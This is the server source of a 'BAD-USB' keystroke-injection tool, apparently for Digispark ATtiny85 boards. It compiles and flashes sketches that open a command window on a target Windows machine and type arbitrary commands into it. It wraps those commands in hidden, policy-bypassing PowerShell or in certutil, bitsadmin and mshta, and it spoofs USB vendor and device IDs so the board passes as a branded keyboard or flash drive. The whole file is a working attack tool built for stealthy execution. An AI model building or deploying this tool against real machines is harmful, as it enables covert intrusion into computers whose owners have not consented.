const express = require('express')
const { spawn, spawnSync } = require('child_process')
const fs = require('fs')
const path = require('path')
const os = require('os')
const http = require('http')
const socketIo = require('socket.io')
const cors = require('cors')

const app = express()
app.use(cors())
app.use(express.json())

const server = http.createServer(app)
const io = socketIo(server, { cors: { origin: '*' } })

const BASE      = __dirname
const ROOT      = path.join(BASE, '..')          // project root (one level up from server/)
const isWin     = process.platform === 'win32'
const TOOLS     = path.join(ROOT, 'tools')
const SKETCH    = path.join(ROOT, 'temp_sketch')
const AVR_BUILD = path.join(ROOT, 'build_avr')
const FINAL     = path.join(ROOT, 'final')

// Locate the DigiKeyboard library's usbconfig.h — this is what the compiler actually reads
const _arduino15 = process.env.LOCALAPPDATA
    ? path.join(process.env.LOCALAPPDATA, 'Arduino15')
    : path.join(os.homedir(), 'AppData', 'Local', 'Arduino15')
const _digiBase = path.join(_arduino15, 'packages', 'digistump', 'hardware', 'avr')
const _digiVer  = (() => { try { return fs.readdirSync(_digiBase).sort().pop() } catch(_) { return '1.7.5' } })()
const LIB_USB_CFG     = path.join(_digiBase, _digiVer, 'libraries', 'DigisparkKeyboard', 'usbconfig.h')
const LIB_USB_CFG_BAK = LIB_USB_CFG + '.bak'

function resolveTool(envKey, name) {
    if (process.env[envKey]) return process.env[envKey]
    const ext     = isWin ? '.exe' : ''
    const inTools = path.join(TOOLS, name + ext)
    const inRoot  = path.join(ROOT,  name + ext)
    return fs.existsSync(inTools) ? inTools : inRoot
}

const ARDUINO = resolveTool('ARDUINO_CLI', 'arduino-cli')
const MICRO   = resolveTool('MICRONUCLEUS', 'micronucleus')

// In production, serve the built React app from client/dist/
if (process.env.NODE_ENV === 'production') {
    const clientDist = path.join(ROOT, 'client', 'dist')
    app.use(express.static(clientDist))
    app.get('*', (req, res) => res.sendFile(path.join(clientDist, 'index.html')))
}

// ─── device state ─────────────────────────────────────────────────────────────
let busy          = false
let uploadProcess = null
let lastBusyMs    = 0

// ─── typing speed ─────────────────────────────────────────────────────────────
// speed is a raw ms delay per character (0–1000).
// 0ms  = absolute ATtiny85 minimum; V-USB poll cycle (~10ms) is the only bottleneck.
// 1000ms = 1 char/sec (~12 WPM at 5 chars/word).

// ─── helpers ───────────────────────────────────────────────────────────────────
function log(socket, msg, type = 'log') {
    socket.emit('log', { type, msg: String(msg) })
}

function esc(str) {
    return str.replace(/\\/g, '\\\\').replace(/"/g, '\\"')
}

// ─── device profiles (VID/PID spoofing) ────────────────────────────────────────
const DEVICE_PROFILES = {
    default:        { vid: '0x16C0', pid: '0x27DB', vendor: 'digistump.com',   device: 'DigiKey'           },
    logitech_k120:  { vid: '0x046D', pid: '0xC31C', vendor: 'Logitech',         device: 'USB Keyboard'      },
    dell_kb216:     { vid: '0x413C', pid: '0x2113', vendor: 'Dell Inc.',         device: 'Dell USB Keyboard' },
    hp_kb:          { vid: '0x03F0', pid: '0x0024', vendor: 'HP',                device: 'HP USB Keyboard'   },
    lenovo_kb:      { vid: '0x17EF', pid: '0x6009', vendor: 'Lenovo',            device: 'USB Keyboard'      },
    cherry_kb:      { vid: '0x046A', pid: '0x0001', vendor: 'Cherry GmbH',       device: 'USB Keyboard'      },
    sandisk_usb:    { vid: '0x0781', pid: '0x5567', vendor: 'SanDisk',           device: 'Cruzer Blade'      },
    generic_hid:    { vid: '0x1D50', pid: '0x6000', vendor: 'OpenMoko Inc.',     device: 'USB Keyboard'      },
}

function hexToLeBytes(hex) {
    const v  = parseInt(hex, 16)
    const lo = (v & 0xFF).toString(16).padStart(2, '0').toUpperCase()
    const hi = ((v >> 8) & 0xFF).toString(16).padStart(2, '0').toUpperCase()
    return `0x${lo}, 0x${hi}`
}

function strToCharArray(s) {
    return s.split('').map(c => `'${c}'`).join(',')
}

function buildUsbConfig(deviceProfile, customVid, customPid) {
    if (!deviceProfile || deviceProfile === 'default') return null

    let vid, pid, vendor, device
    if (deviceProfile === 'custom') {
        const validHex = /^0x[0-9a-fA-F]{1,4}$/
        vid    = validHex.test(customVid)  ? customVid  : '0x16C0'
        pid    = validHex.test(customPid)  ? customPid  : '0x27DB'
        vendor = 'USB Device'
        device = 'USB Input'
    } else {
        const p = DEVICE_PROFILES[deviceProfile]
        if (!p) return null
        ;({ vid, pid, vendor, device } = p)
    }

    return `/* usbconfig.h — spoofed: ${deviceProfile} ${vid}/${pid} */
#ifndef __usbconfig_h_included__
#define __usbconfig_h_included__
#define USB_CFG_CLOCK_KHZ               (F_CPU/1000)
#define USB_CFG_CHECK_CRC               0
#define USB_CFG_HAVE_INTRIN_ENDPOINT    1
#define USB_CFG_HAVE_INTRIN_ENDPOINT3   0
#define USB_CFG_EP3_NUMBER              3
#define USB_CFG_IMPLEMENT_HALT          0
#define USB_CFG_SUPPRESS_INTR_CODE      0
#define USB_CFG_INTR_POLL_INTERVAL      10
#define USB_CFG_IS_SELF_POWERED         0
#define USB_CFG_MAX_BUS_POWER           100
#define USB_CFG_IMPLEMENT_FN_WRITE      0
#define USB_CFG_IMPLEMENT_FN_READ       0
#define USB_CFG_IMPLEMENT_FN_WRITEOUT   0
#define USB_CFG_HAVE_FLOWCONTROL        0
#define USB_CFG_LONG_TRANSFERS          0
#define USB_COUNT_SOF                   0
#define USB_CFG_CHECK_DATA_TOGGLING     0
#define USB_CFG_HAVE_MEASURE_FRAME_LENGTH 1
#include "osccal.h"
#define USB_USE_FAST_CRC                0
#define USB_CFG_VENDOR_ID               ${hexToLeBytes(vid)}
#define USB_CFG_DEVICE_ID               ${hexToLeBytes(pid)}
#define USB_CFG_DEVICE_VERSION          0x00, 0x01
#define USB_CFG_VENDOR_NAME             ${strToCharArray(vendor)}
#define USB_CFG_VENDOR_NAME_LEN         ${vendor.length}
#define USB_CFG_DEVICE_NAME             ${strToCharArray(device)}
#define USB_CFG_DEVICE_NAME_LEN         ${device.length}
#define USB_CFG_DEVICE_CLASS            0
#define USB_CFG_DEVICE_SUBCLASS         0
#define USB_CFG_INTERFACE_CLASS         0x03
#define USB_CFG_INTERFACE_SUBCLASS      0x01
#define USB_CFG_INTERFACE_PROTOCOL      0x01
#define USB_CFG_HID_REPORT_DESCRIPTOR_LENGTH 35
#define USB_CFG_DESCR_PROPS_DEVICE                0
#define USB_CFG_DESCR_PROPS_CONFIGURATION         0
#define USB_CFG_DESCR_PROPS_STRINGS               0
#define USB_CFG_DESCR_PROPS_STRING_0              0
#define USB_CFG_DESCR_PROPS_STRING_VENDOR         0
#define USB_CFG_DESCR_PROPS_STRING_PRODUCT        0
#define USB_CFG_DESCR_PROPS_STRING_SERIAL_NUMBER  0
#define USB_CFG_DESCR_PROPS_HID                   0
#define USB_CFG_DESCR_PROPS_HID_REPORT            0
#define USB_CFG_DESCR_PROPS_UNKNOWN               0
#include "usbboardconfig.h"
#endif`
}

// ─── banner ────────────────────────────────────────────────────────────────────
const BANNER = String.raw`                                   ███████████████
                                   ███████████████
                                   ███████████████
                                   ██   █████   ██
                                   ███████████████
                                █████████████████████
                                █████████████████████
                                ██    █████████    ██
                                ███      ███      ███
                                ██████████ ██████████
                                ██████████ ██████████
                                ██████████ ██████████
                                ██████████ ███   ████
                                ████   ███ ████ █████
                                █████ ████ ██  ██████
                                ██████  ██  █████████
                                ████████   ██████████
                                ██████████ ██████████
                                ████████     ████████
                                  ███████   ████████

`

// ─── help ──────────────────────────────────────────────────────────────────────
function sendHelp(socket) {
    const lines = [
        '══════════════ COMMAND REFERENCE ══════════════',
        '',
        'BIN  (payload wrapper)',
        '  powershell       powershell -NoProfile -Command "..."',
        '  powershell_bp    + ExecutionPolicy Bypass',
        '  powershell_hid   + WindowStyle Hidden',
        '  powershell_full  Bypass + Hidden (stealthiest)',
        '  cmd              cmd /c ...',
        '  certutil         certutil ...',
        '  bitsadmin        bitsadmin ...',
        '  mshta            mshta "..."',
        '  custom           <your binary> ...',
        '',
        'VIA  (how the window opens on target)',
        '  run         WIN+R  Run Dialog           ✓ most reliable',
        '  search      WIN+S  Search Bar',
        '  explorer    WIN+E  Explorer Address Bar',
        '  startmenu   WIN    Start Menu Search',
        '  winx_ps         WIN+X  → PowerShell (Win10) / Terminal (Win11)',
        '  taskmanager     C+S+E  → Alt+F → R  (Win10 only)',
        '  taskmanager_w11 C+S+E  → Alt+N        (Win11)',
        '',
        'SPEED  (per-character typing delay — OS window delays are fixed)',
        '  0ms = ATtiny85 max speed  |  1000ms = 1 char/sec',
        '',
        'REGISTRY',
        '  -p "HKCU\\Software\\Test" -k "Key" -string "Value"',
        '',
        'DEVICE PROFILE  (VID/PID spoofing — written to usbconfig.h)',
        '  default        0x16C0/0x27DB  Digispark (no spoofing)',
        '  logitech_k120  0x046D/0xC31C  Logitech K120',
        '  dell_kb216     0x413C/0x2113  Dell KB216',
        '  hp_kb          0x03F0/0x0024  HP USB Keyboard',
        '  lenovo_kb      0x17EF/0x6009  Lenovo USB Keyboard',
        '  cherry_kb      0x046A/0x0001  Cherry GmbH USB Keyboard',
        '  sandisk_usb    0x0781/0x5567  SanDisk Cruzer Blade',
        '  generic_hid    0x1D50/0x6000  Generic HID Keyboard',
        '  custom         enter your own VID + PID in hex (0x...)',
        '',
        'SKETCH MODE',
        '  Write raw DigiKeyboard.h code — uploaded directly.',
        '══════════════════════════════════════════════',
    ]
    lines.forEach(l => log(socket, l))
}

// ─── bin wrappers ──────────────────────────────────────────────────────────────
function buildCommand(bin, cmd, customBin) {
    switch (bin) {
        case 'powershell':
            return `powershell -NoProfile -Command "${cmd}"`
        case 'powershell_bp':
            return `powershell -NoProfile -ExecutionPolicy Bypass -Command "${cmd}"`
        case 'powershell_hid':
            return `powershell -WindowStyle Hidden -NoProfile -Command "${cmd}"`
        case 'powershell_full':
            return `powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "${cmd}"`
        case 'cmd':
            return `cmd /c ${cmd}`
        case 'certutil':
            return `certutil ${cmd}`
        case 'bitsadmin':
            return `bitsadmin ${cmd}`
        case 'mshta':
            return `mshta "${cmd}"`
        case 'custom':
            return customBin ? `${customBin.trim()} ${cmd}` : `cmd /c ${cmd}`
        default:
            return `cmd /c ${cmd}`
    }
}

// ─── trigger code builders ─────────────────────────────────────────────────────
function buildTriggerCode(trigger, escaped) {
    switch (trigger) {

        case 'run':
            return `
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(900);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'search':
            return `
DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
DigiKeyboard.delay(1200);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'explorer':
            return `
DigiKeyboard.sendKeyStroke(KEY_E, MOD_GUI_LEFT);
DigiKeyboard.delay(1500);
DigiKeyboard.sendKeyStroke(KEY_L, MOD_CONTROL_LEFT);
DigiKeyboard.delay(400);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'startmenu':
            return `
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
DigiKeyboard.delay(1800);
typeStr("${escaped}");
DigiKeyboard.delay(600);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'winx_ps':
            return `
DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
DigiKeyboard.delay(1500);
DigiKeyboard.sendKeyStroke(KEY_I);
DigiKeyboard.delay(1800);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'taskmanager':
            return `
DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
DigiKeyboard.delay(2500);
DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
DigiKeyboard.delay(600);
DigiKeyboard.sendKeyStroke(KEY_R);
DigiKeyboard.delay(1000);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        case 'taskmanager_w11':
            return `
DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
DigiKeyboard.delay(2500);
DigiKeyboard.sendKeyStroke(KEY_N, MOD_ALT_LEFT);
DigiKeyboard.delay(800);
typeStr("${escaped}");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);`

        default:
            return null
    }
}

function makeSketch(triggerCode, typeDelay = 0) {
    const typeFn = typeDelay > 0
        ? `void typeStr(const char* s){for(int i=0;s[i];i++){DigiKeyboard.print(s[i]);DigiKeyboard.delay(${typeDelay});}}`
        : `void typeStr(const char* s){DigiKeyboard.print(s);}`
    return `#include "DigiKeyboard.h"
${typeFn}
void setup(){
  DigiKeyboard.delay(4000);
${triggerCode}
}
void loop(){}
`
}

// ─── compile + upload ──────────────────────────────────────────────────────────
function buildAndUpload(socket, triggerCode, usbCfg = null, typeDelay = 0) {
    if (busy) {
        const now = Date.now()
        if (now - lastBusyMs > 3000) {
            lastBusyMs = now
            log(socket, 'STATUS: device busy — click RESET to force release', 'status')
        }
        return
    }
    busy = true

    try {
        if (!fs.existsSync(SKETCH)) fs.mkdirSync(SKETCH, { recursive: true })
        if (!fs.existsSync(FINAL))  fs.mkdirSync(FINAL,  { recursive: true })
        if (fs.existsSync(AVR_BUILD)) fs.rmSync(AVR_BUILD, { recursive: true, force: true })
        fs.mkdirSync(AVR_BUILD)

        fs.writeFileSync(path.join(SKETCH, 'temp_sketch.ino'), makeSketch(triggerCode, typeDelay))

        let libPatched = false
        if (usbCfg) {
            try {
                fs.copyFileSync(LIB_USB_CFG, LIB_USB_CFG_BAK)
                fs.writeFileSync(LIB_USB_CFG, usbCfg)
                libPatched = true
                log(socket, 'DETAIL: library usbconfig.h patched — VID/PID spoofed', 'detail')
            } catch (e) {
                log(socket, 'DETAIL: could not patch library usbconfig.h — using default VID/PID', 'detail')
            }
        }

        function restoreLibCfg() {
            if (libPatched && fs.existsSync(LIB_USB_CFG_BAK)) {
                try { fs.copyFileSync(LIB_USB_CFG_BAK, LIB_USB_CFG); fs.unlinkSync(LIB_USB_CFG_BAK) } catch(_) {}
                libPatched = false
            }
        }

        log(socket, 'DETAIL: sketch written — compiling', 'detail')

        const compile = spawn(ARDUINO, [
            'compile', '--fqbn', 'digistump:avr:digispark-tiny',
            SKETCH, '--build-path', AVR_BUILD,
        ])

        compile.stdout.on('data', d => { const s = d.toString().trim(); if (s) log(socket, 'COMPILE: ' + s, 'build') })
        compile.stderr.on('data', d => { const s = d.toString().trim(); if (s) log(socket, 'BUILD LOG: ' + s, 'build') })

        compile.on('close', exitCode => {
            restoreLibCfg()
            if (exitCode !== 0) {
                log(socket, 'CRITICAL: compile failed (exit ' + exitCode + ')', 'error')
                busy = false
                return
            }

            const hexFile = fs.readdirSync(AVR_BUILD).find(f => f.endsWith('.hex'))
            if (!hexFile) {
                log(socket, 'CRITICAL: no .hex produced', 'error')
                busy = false
                return
            }

            const finalHex = path.join(FINAL, 'payload.hex')
            fs.copyFileSync(path.join(AVR_BUILD, hexFile), finalHex)

            log(socket, 'DETAIL: compile OK — plug in Digispark now', 'detail')

            const upload = spawn(MICRO, ['--run', finalHex])
            uploadProcess = upload

            const timeout = setTimeout(() => {
                if (uploadProcess === upload) {
                    log(socket, 'STATUS: timeout after 60 s — device lock released', 'status')
                    upload.kill()
                    uploadProcess = null
                    busy = false
                }
            }, 60000)

            upload.stdout.on('data', d => { const s = d.toString().trim(); if (s) log(socket, 'UPLOAD: ' + s, 'upload') })
            upload.stderr.on('data', d => { const s = d.toString().trim(); if (s) log(socket, 'UPLOAD LOG: ' + s, 'upload') })

            upload.on('close', () => {
                clearTimeout(timeout)
                if (uploadProcess === upload) uploadProcess = null
                log(socket, 'STATUS: upload complete', 'status')
                busy = false
            })
        })

    } catch (e) {
        log(socket, 'CRITICAL: ' + e.message, 'error')
        busy = false
    }
}

// ─── payload orchestration ─────────────────────────────────────────────────────
function runPayload(socket, { bin = 'powershell', customBin = '', trigger = 'run', cmd, speed = 0, deviceProfile = 'default', customVid = '', customPid = '' }) {
    const typeDelay = Math.min(1000, Math.max(0, Math.round(Number(speed) || 0)))
    log(socket, `DETAIL: bin=${bin} via=${trigger} speed=${typeDelay}ms/char usb=${deviceProfile}`, 'detail')
    const command     = buildCommand(bin, cmd, customBin)
    const escaped     = esc(command)
    const triggerCode = buildTriggerCode(trigger, escaped)
    if (!triggerCode) { log(socket, 'CRITICAL: unknown trigger "' + trigger + '"', 'error'); return }
    const usbCfg = buildUsbConfig(deviceProfile, customVid, customPid)
    buildAndUpload(socket, triggerCode, usbCfg, typeDelay)
}

// ─── registry ──────────────────────────────────────────────────────────────────
function registryParser(text) {
    const p = text.match(/-p\s+"?([^"]+)"?/)?.[1]
    const k = text.match(/-k\s+"?([^"]+)"?/)?.[1]
    const v = text.match(/-string\s+"?([^"]+)"?/)?.[1]
    if (!p || !k || !v) return null
    return `New-Item -Path '${p}' -Force; New-ItemProperty -Path '${p}' -Name '${k}' -Value '${v}' -PropertyType String -Force`
}

// ─── socket handlers ───────────────────────────────────────────────────────────
io.on('connection', socket => {
    log(socket, BANNER, 'banner')
    log(socket, "DETAIL: connected — type 'help' for reference", 'detail')

    socket.on('help', () => sendHelp(socket))

    socket.on('run-payload', data => runPayload(socket, data))

    socket.on('run-sketch', ({ code, deviceProfile = 'default', customVid = '', customPid = '' }) => {
        log(socket, 'DETAIL: custom sketch mode', 'detail')
        const usbCfg = buildUsbConfig(deviceProfile, customVid, customPid)
        buildAndUpload(socket, code, usbCfg)
    })

    socket.on('preview-sketch', ({ bin, customBin, trigger, cmd, speed }) => {
        const typeDelay   = Math.min(1000, Math.max(0, Math.round(Number(speed) || 0)))
        const command     = buildCommand(bin || 'powershell', cmd, customBin)
        const escaped     = esc(command)
        const triggerCode = buildTriggerCode(trigger || 'run', escaped)
        if (!triggerCode) { log(socket, 'CRITICAL: unknown trigger', 'error'); return }
        socket.emit('sketch-content', makeSketch(triggerCode, typeDelay))
    })

    socket.on('run-registry', ({ cmd }) => {
        if (!cmd) return
        if (cmd.toString().trim().toLowerCase() === 'help') { sendHelp(socket); return }
        const ps = registryParser(cmd)
        if (!ps) { log(socket, 'CRITICAL: invalid registry syntax — see help', 'error'); return }
        runPayload(socket, { bin: 'powershell', trigger: 'run', cmd: ps })
    })

    socket.on('force-reset', () => {
        if (uploadProcess) { uploadProcess.kill(); uploadProcess = null }
        busy       = false
        lastBusyMs = 0
        log(socket, 'STATUS: device lock force-released', 'status')
    })
})

const PORT = process.env.SERVER_PORT || 5000
server.listen(PORT, () => console.log(`BAD-USB server running on :${PORT}`))
